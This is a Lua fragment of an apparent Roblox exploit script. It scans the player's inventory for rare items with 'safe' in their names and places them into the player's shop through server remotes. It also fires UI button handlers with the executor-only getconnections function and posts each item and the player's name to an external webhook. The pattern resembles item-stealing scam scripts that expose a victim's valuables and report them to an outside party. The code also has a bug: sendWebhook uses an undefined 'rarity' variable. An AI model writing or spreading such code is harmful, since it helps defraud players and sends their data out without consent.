local function isTargetItem(itemId)
    local itemData = ItemsModule[itemId]
    if not itemData then return false end
    
    local name = itemData.Name or ""
    local rarity = itemData.Rarity or ""
    
    -- Only target Insane or Legendary AND must contain "safe"
    if rarity == "Insane" or rarity == "Legendary" then
        local hasSafeInName = string.find(string.lower(name), "safe") ~= nil
        return hasSafeInName, itemData
    end
    
    return false, itemData
end

local function sendWebhook(itemId, itemData, playerName)
    local webhookData = {
        content = "",
        embeds = {{
            title = "Target Item Found",
            color = rarity == "Insane" and 16711680 or 65280, -- Red for Insane, Green for Legendary
            fields = {
                {name="Item ID",value=itemId,inline=true},
                {name="Name",value=itemData.Name,inline=true},
                {name="Rarity",value=itemData.Rarity,inline=true},
                {name="Found By",value=playerName,inline=false}
            },
            footer = {text=os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    pcall(function()
        HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(webhookData)
        })
    end)
end

local function tryClick(obj)
    if not obj then return end
    pcall(function() obj:Activate() end)
    if getconnections then
        for _, v in pairs(getconnections(obj.MouseButton1Click)) do
            pcall(function() v:Fire() end)
        end
    end
end

local function generatePosition(index)
    local row = math.floor((index - 1) / GRID_CONFIG.itemsPerRow)
    local col = (index - 1) % GRID_CONFIG.itemsPerRow
    local xOffset = col * GRID_CONFIG.spacing
    local zOffset = row * GRID_CONFIG.spacing
    if row >= GRID_CONFIG.rowsPerFloor then
        return nil
    end
    return GRID_CONFIG.startPos + Vector3.new(xOffset, 0, zOffset)
end

local function getFurnitureCount(playerData)
    local count = 0
    if playerData and playerData.Furniture then
        for _ in pairs(playerData.Furniture) do
            count = count + 1
        end
    end
    return count
end

local function findTargetItemsInInventory(playerData)
    local items = {}
    if playerData and playerData.Inventory then
        for guid, itemData in pairs(playerData.Inventory) do
            -- Check if item is target based on our new rules
            local isTarget, _ = isTargetItem(tostring(itemData.Id))
            if isTarget then
                table.insert(items,{GUID=guid,Id=itemData.Id,Data=itemData})
            end
        end
    end
    return items
end

local function verifyItemRemoved(guid)
    task.wait(0.5)
    local playerData = DataEvent:InvokeServer()
    if playerData and playerData.Inventory then
        return playerData.Inventory[guid] == nil
    end
    return false
end

local function PlaceTargetInventoryItems()
    local playerData = DataEvent:InvokeServer()
    if not playerData then return false end
    local itemsToPlace = findTargetItemsInInventory(playerData)
    if #itemsToPlace == 0 then return true end
    local currentFurniture = getFurnitureCount(playerData)
    local maxShopSpace = playerData.ShopSpace or 100
    local availableSpace = maxShopSpace - currentFurniture
    local maxPositions = GRID_CONFIG.itemsPerRow * GRID_CONFIG.rowsPerFloor
    local canPlaceCount = math.min(availableSpace, maxPositions, #itemsToPlace)
    if canPlaceCount == 0 then return false end
    local placedCount = 0
    for i, item in ipairs(itemsToPlace) do
        if placedCount >= canPlaceCount then break end
        local positionIndex = placedCount + 1
        local placed = false
        local retryCount = 0
        local maxRetries = maxPositions - positionIndex + 1
        while not placed and retryCount < maxRetries do
            local itemPos = generatePosition(positionIndex + retryCount)
            if not itemPos then break end
            local args = {
                {
                    GUID = item.GUID,
                    Type = "Decor",
                    Floor = 1,
                    Id = item.Id,
                    CFrame = CFrame.new(itemPos)
                }
            }
            local success = pcall(function()
                return Shop.InsertFurniture:InvokeServer(unpack(args))
            end)
            if success and verifyItemRemoved(item.GUID) then
                placed = true
                placedCount = placedCount + 1
            else
                retryCount = retryCount + 1
            end
            task.wait(0.2)
        end
        task.wait(0.1)
    end
    return true
end

